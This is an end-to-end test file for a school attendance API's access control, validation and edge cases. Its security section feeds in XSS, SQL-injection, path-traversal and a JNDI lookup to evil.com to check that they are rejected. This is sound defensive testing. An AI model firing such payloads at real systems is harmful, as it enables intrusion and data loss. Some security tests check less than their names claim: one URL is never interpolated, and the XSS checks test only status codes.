import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma/prisma.service';

// Set test environment variables
process.env.JWT_SECRET = 'test-jwt-secret-minimum-32-characters-long-12345';
process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters-long-67890';
process.env.NODE_ENV = 'test';
process.env.REDIS_URL = 'redis://localhost:6379';

describe('AttendanceController (e2e)', () => {
    let app: INestApplication;
    let prisma: PrismaService;

    // Test data
    let adminToken: string;
    let teacherToken: string;
    let parentToken: string;
    let studentToken: string;
    let adminId: string;
    let teacherId: string;
    let studentId: string;
    let courseId: string;
    let classId: string;
    let sessionId: string;

    beforeAll(async () => {
        const moduleFixture: TestingModule = await Test.createTestingModule({
            imports: [AppModule],
        }).compile();

        app = moduleFixture.createNestApplication();
        app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
        await app.init();

        prisma = moduleFixture.get<PrismaService>(PrismaService);
    });

    afterAll(async () => {
        await app.close();
    });

    beforeEach(async () => {
        // Clean up in correct order
        await prisma.attendanceRecord.deleteMany({});
        await prisma.attendanceSession.deleteMany({});
        await prisma.classEnrollment.deleteMany({});
        await prisma.classTeacher.deleteMany({});
        await prisma.class.deleteMany({});
        await prisma.course.deleteMany({});
        await prisma.parentStudent.deleteMany({});
        await prisma.userRole.deleteMany({});
        await prisma.refreshToken.deleteMany({});
        await prisma.user.deleteMany({
            where: { email: { contains: 'test@' } },
        });

        // Create test users
        const adminResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@admin.school.com',
                password: 'Password123!',
                firstName: 'Admin',
                lastName: 'User',
                role: 'admin',
            });
        adminToken = adminResponse.body.accessToken;
        adminId = adminResponse.body.user.id;

        const teacherResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@teacher.school.com',
                password: 'Password123!',
                firstName: 'Teacher',
                lastName: 'User',
                role: 'teacher',
            });
        teacherToken = teacherResponse.body.accessToken;
        teacherId = teacherResponse.body.user.id;

        const parentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@parent.school.com',
                password: 'Password123!',
                firstName: 'Parent',
                lastName: 'User',
                role: 'parent',
            });
        parentToken = parentResponse.body.accessToken;

        const studentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@student.school.com',
                password: 'Password123!',
                firstName: 'Student',
                lastName: 'User',
                role: 'student',
            });
        studentToken = studentResponse.body.accessToken;
        studentId = studentResponse.body.user.id;

        // Create course
        const courseResponse = await request(app.getHttpServer())
            .post('/api/courses')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
                code: 'ATT101',
                name: 'Attendance Test Course',
            });
        courseId = courseResponse.body.id;

        // Create class
        const classResponse = await request(app.getHttpServer())
            .post('/api/classes')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
                courseId: courseId,
                teacherId: teacherId,
                term: 'Fall 2025',
            });
        classId = classResponse.body.id;

        // Enroll student
        await request(app.getHttpServer())
            .post(`/api/classes/${classId}/enroll`)
            .set('Authorization', `Bearer ${adminToken}`)
            .send({ studentId: studentId });
    });

    // ===============================================================================
    // AUTHENTICATION TESTS
    // ===============================================================================
    describe('Authentication', () => {
        it('should return 401 when no token provided', async () => {
            await request(app.getHttpServer())
                .get(`/api/classes/${classId}/attendance`)
                .expect(401);
        });

        it('should return 401 for session creation without token', async () => {
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .send({ date: new Date().toISOString() })
                .expect(401);
        });

        it('should return 401 with malformed token', async () => {
            await request(app.getHttpServer())
                .get(`/api/classes/${classId}/attendance`)
                .set('Authorization', 'Bearer not-a-valid-token')
                .expect(401);
        });
    });

    // ===============================================================================
    // ROLE-BASED ACCESS TESTS
    // ===============================================================================
    describe('Role-Based Access Control', () => {
        describe('Session Management', () => {
            it('should allow admin to create attendance session', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                        notes: 'Test session',
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
            });

            it('should allow teacher to create attendance session', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
            });

            it('should block parent from creating sessions', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        date: new Date().toISOString(),
                    })
                    .expect(403);
            });

            it('should block student from creating sessions', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        date: new Date().toISOString(),
                    })
                    .expect(403);
            });
        });

        describe('Attendance Marking', () => {
            beforeEach(async () => {
                // Create a session for marking
                const session = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                    });
                sessionId = session.body.id;
            });

            it('should allow admin to mark attendance', async () => {
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ status: 'present' })
                    .expect(200);
            });

            it('should allow teacher to mark attendance', async () => {
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'present' })
                    .expect(200);
            });

            it('should block parent from marking attendance', async () => {
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({ status: 'present' })
                    .expect(403);
            });

            it('should block student from marking own attendance', async () => {
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({ status: 'present' })
                    .expect(403);
            });
        });

        describe('Bulk Attendance', () => {
            it('should allow admin to bulk mark attendance', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                        records: [
                            { studentId: studentId, status: 'present' },
                        ],
                    })
                    .expect(201);
            });

            it('should allow teacher to bulk mark attendance', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        records: [
                            { studentId: studentId, status: 'present' },
                        ],
                    })
                    .expect(201);
            });

            it('should block parent from bulk marking', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        date: new Date().toISOString(),
                        records: [{ studentId: studentId, status: 'present' }],
                    })
                    .expect(403);
            });
        });

        describe('Admin Reports', () => {
            it('should allow admin to access attendance reports', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/attendance/reports')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block teacher from admin reports', async () => {
                await request(app.getHttpServer())
                    .get('/api/attendance/reports')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(403);
            });

            it('should allow teacher to access weekly attendance', async () => {
                const today = new Date();
                const lastWeek = new Date(today.getTime() - 7 * 24 * 60 * 60 * 1000);

                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/attendance/weekly?startDate=${lastWeek.toISOString()}&endDate=${today.toISOString()}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should allow teacher to access class summary', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/attendance/summary`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block student from class summary', async () => {
                await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/attendance/summary`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(403);
            });
        });
    });

    // ===============================================================================
    // ATTENDANCE SESSIONS CRUD TESTS
    // ===============================================================================
    describe('Attendance Sessions', () => {
        describe('POST /api/classes/:classId/attendance', () => {
            it('should return 201 when creating session', async () => {
                const response = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                        notes: 'Morning session',
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
                expect(response.body.date).toBeDefined();
            });

            it('should return 400 for invalid date format', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: 'not-a-date',
                        period: 1,
                    })
                    .expect(400);
            });

            it('should return 400 for invalid period range', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 10, // Invalid: should be 1-3
                    })
                    .expect(400);
            });

            it('should return 400 for negative period', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: -1,
                    })
                    .expect(400);
            });

            it('should return 404 for non-existent class', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .post(`/api/classes/${nonExistentUuid}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                    })
                    .expect(404);
            });
        });

        describe('GET /api/classes/:classId/attendance', () => {
            beforeEach(async () => {
                // Create some sessions
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                    });
            });

            it('should return list of sessions', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });

            it('should filter by date range', async () => {
                const today = new Date();
                const lastWeek = new Date(today.getTime() - 7 * 24 * 60 * 60 * 1000);

                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${classId}/attendance?startDate=${lastWeek.toISOString()}&endDate=${today.toISOString()}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });

            it('should return empty array when no sessions', async () => {
                // Create new class with no sessions
                const newClass = await request(app.getHttpServer())
                    .post('/api/classes')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        courseId: courseId,
                        teacherId: teacherId,
                        term: 'Spring 2025',
                    });

                const response = await request(app.getHttpServer())
                    .get(`/api/classes/${newClass.body.id}/attendance`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body).toEqual([]);
            });
        });

        describe('GET /api/attendance/sessions/:sessionId', () => {
            beforeEach(async () => {
                const session = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                    });
                sessionId = session.body.id;
            });

            it('should return session details', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/attendance/sessions/${sessionId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.id).toBe(sessionId);
            });

            it('should return 404 for non-existent session', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .get(`/api/attendance/sessions/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(404);
            });

            it('should return 400 for invalid UUID', async () => {
                await request(app.getHttpServer())
                    .get('/api/attendance/sessions/invalid-uuid')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(400);
            });
        });
    });

    // ===============================================================================
    // ATTENDANCE MARKING TESTS
    // ===============================================================================
    describe('Attendance Marking', () => {
        beforeEach(async () => {
            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    date: new Date().toISOString(),
                    period: 1,
                });
            sessionId = session.body.id;
        });

        describe('PUT /api/attendance/:sessionId/students/:studentId', () => {
            it('should mark student as present', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'present' })
                    .expect(200);

                expect(response.body.status).toBe('present');
            });

            it('should mark student as absent', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'absent' })
                    .expect(200);

                expect(response.body.status).toBe('absent');
            });

            it('should mark student as late', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'late' })
                    .expect(200);

                expect(response.body.status).toBe('late');
            });

            it('should mark student as excused', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'excused' })
                    .expect(200);

                expect(response.body.status).toBe('excused');
            });

            it('should update existing attendance record', async () => {
                // First mark as present
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'present' });

                // Then update to absent
                const response = await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'absent' })
                    .expect(200);

                expect(response.body.status).toBe('absent');
            });

            it('should return 400 for invalid status', async () => {
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'invalid_status' })
                    .expect(400);
            });

            it('should return 404 for non-existent session', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .put(`/api/attendance/${nonExistentUuid}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'present' })
                    .expect(404);
            });

            it('should return 404 for non-existent student', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'present' })
                    .expect(404);
            });

            it('should allow marking with notes', async () => {
                const response = await request(app.getHttpServer())
                    .put(`/api/attendance/${sessionId}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        status: 'late',
                        notes: 'Arrived 10 minutes late due to traffic',
                    })
                    .expect(200);

                expect(response.body.notes).toBe('Arrived 10 minutes late due to traffic');
            });
        });
    });

    // ===============================================================================
    // BULK ATTENDANCE TESTS
    // ===============================================================================
    describe('Bulk Attendance', () => {
        describe('POST /api/classes/:classId/attendance/bulk', () => {
            it('should create session and mark multiple students', async () => {
                // Create another student
                const anotherStudent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@student2.school.com',
                        password: 'Password123!',
                        firstName: 'Another',
                        lastName: 'Student',
                        role: 'student',
                    });

                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/enroll`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({ studentId: anotherStudent.body.user.id });

                const response = await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        period: 1,
                        records: [
                            { studentId: studentId, status: 'present' },
                            { studentId: anotherStudent.body.user.id, status: 'absent', notes: 'Sick leave' },
                        ],
                        sessionNotes: 'Morning attendance',
                    })
                    .expect(201);

                expect(response.body).toBeDefined();
            });

            it('should limit bulk records to 200 students', async () => {
                const manyRecords = Array(201).fill({
                    studentId: studentId,
                    status: 'present',
                });

                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        records: manyRecords,
                    })
                    .expect(400);
            });

            it('should validate student IDs in bulk records', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        records: [
                            { studentId: 'invalid-uuid', status: 'present' },
                        ],
                    })
                    .expect(400);
            });

            it('should validate status values in bulk', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        records: [
                            { studentId: studentId, status: 'invalid' },
                        ],
                    })
                    .expect(400);
            });

            it('should handle empty records array', async () => {
                await request(app.getHttpServer())
                    .post(`/api/classes/${classId}/attendance/bulk`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        date: new Date().toISOString(),
                        records: [],
                    })
                    .expect(201);
            });
        });
    });

    // ===============================================================================
    // ATTENDANCE HISTORY TESTS
    // ===============================================================================
    describe('Attendance History', () => {
        beforeEach(async () => {
            // Create session and mark attendance
            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    date: new Date().toISOString(),
                    period: 1,
                });
            sessionId = session.body.id;

            await request(app.getHttpServer())
                .put(`/api/attendance/${sessionId}/students/${studentId}`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ status: 'present' });
        });

        describe('GET /api/students/:studentId/attendance', () => {
            it('should return student attendance history', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/students/${studentId}/attendance`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });

            it('should filter by classId', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/students/${studentId}/attendance?classId=${classId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });

            it('should filter by date range', async () => {
                const today = new Date();
                const lastWeek = new Date(today.getTime() - 7 * 24 * 60 * 60 * 1000);

                const response = await request(app.getHttpServer())
                    .get(`/api/students/${studentId}/attendance?startDate=${lastWeek.toISOString()}&endDate=${today.toISOString()}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });
        });

        describe('GET /api/attendance/my', () => {
            it('should return own attendance for student', async () => {
                const response = await request(app.getHttpServer())
                    .get('/api/attendance/my')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });

            it('should filter own attendance by class', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/attendance/my?classId=${classId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(Array.isArray(response.body)).toBe(true);
            });
        });
    });

    // ===============================================================================
    // SECURITY TESTS
    // ===============================================================================
    describe('Security Tests', () => {
        it('should sanitize XSS in session notes', async () => {
            const xssPayload = '<script>alert("xss")</script>';

            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    date: new Date().toISOString(),
                    notes: xssPayload,
                })
                .expect(201);
        });

        it('should sanitize XSS in attendance notes', async () => {
            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: new Date().toISOString() });

            await request(app.getHttpServer())
                .put(`/api/attendance/${session.body.id}/students/${studentId}`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    status: 'absent',
                    notes: '<img src=x onerror=alert(1)>',
                })
                .expect(200);
        });

        it('should prevent SQL injection in date parameters', async () => {
            await request(app.getHttpServer())
                .get('/api/classes/${classId}/attendance?startDate=\'; DROP TABLE attendance; --')
                .set('Authorization', `Bearer ${teacherToken}`)
                .expect(400);
        });

        it('should validate UUID format strictly', async () => {
            const injectionAttempts = [
                "' OR '1'='1",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com}",
            ];

            for (const attempt of injectionAttempts) {
                await request(app.getHttpServer())
                    .get(`/api/attendance/sessions/${encodeURIComponent(attempt)}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(400);
            }
        });

        it('should reject oversized notes', async () => {
            const hugeNotes = 'a'.repeat(2000);

            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: new Date().toISOString() });

            await request(app.getHttpServer())
                .put(`/api/attendance/${session.body.id}/students/${studentId}`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({
                    status: 'present',
                    notes: hugeNotes,
                })
                .expect(400);
        });
    });

    // ===============================================================================
    // EDGE CASES
    // ===============================================================================
    describe('Edge Cases', () => {
        it('should handle concurrent attendance marking', async () => {
            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: new Date().toISOString() });

            const promises = Array(5).fill(0).map(() =>
                request(app.getHttpServer())
                    .put(`/api/attendance/${session.body.id}/students/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({ status: 'present' })
            );

            const responses = await Promise.all(promises);

            responses.forEach(response => {
                expect([200, 409]).toContain(response.status);
            });
        });

        it('should handle marking attendance for non-enrolled student', async () => {
            // Create student not enrolled in class
            const newStudent = await request(app.getHttpServer())
                .post('/api/auth/register')
                .send({
                    email: 'test@other.school.com',
                    password: 'Password123!',
                    firstName: 'Other',
                    lastName: 'Student',
                    role: 'student',
                });

            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: new Date().toISOString() });

            const response = await request(app.getHttpServer())
                .put(`/api/attendance/${session.body.id}/students/${newStudent.body.user.id}`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ status: 'present' });

            // Should either succeed (record created) or fail with 403/404
            expect([200, 403, 404]).toContain(response.status);
        });

        it('should handle duplicate session dates gracefully', async () => {
            const date = new Date().toISOString();

            // First session
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date, period: 1 });

            // Duplicate session (should succeed or conflict)
            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date, period: 1 });

            expect([201, 409]).toContain(response.status);
        });

        it('should handle different periods for same date', async () => {
            const date = new Date().toISOString();

            // Period 1
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date, period: 1 })
                .expect(201);

            // Period 2 (should succeed)
            await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date, period: 2 })
                .expect(201);
        });

        it('should handle soft-deleted sessions', async () => {
            const session = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: new Date().toISOString() });

            // Soft delete session
            await prisma.attendanceSession.update({
                where: { id: session.body.id },
                data: { deletedAt: new Date() },
            });

            await request(app.getHttpServer())
                .get(`/api/attendance/sessions/${session.body.id}`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .expect(404);
        });

        it('should handle future dates', async () => {
            const futureDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days in future

            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: futureDate.toISOString() });

            expect([201, 400]).toContain(response.status);
        });

        it('should handle very old dates', async () => {
            const oldDate = new Date('2000-01-01');

            const response = await request(app.getHttpServer())
                .post(`/api/classes/${classId}/attendance`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .send({ date: oldDate.toISOString() });

            expect([201, 400]).toContain(response.status);
        });

        it('should handle weekly report with invalid date range', async () => {
            await request(app.getHttpServer())
                .get(`/api/classes/${classId}/attendance/weekly?startDate=invalid&endDate=invalid`)
                .set('Authorization', `Bearer ${teacherToken}`)
                .expect(400);
        });
    });
});
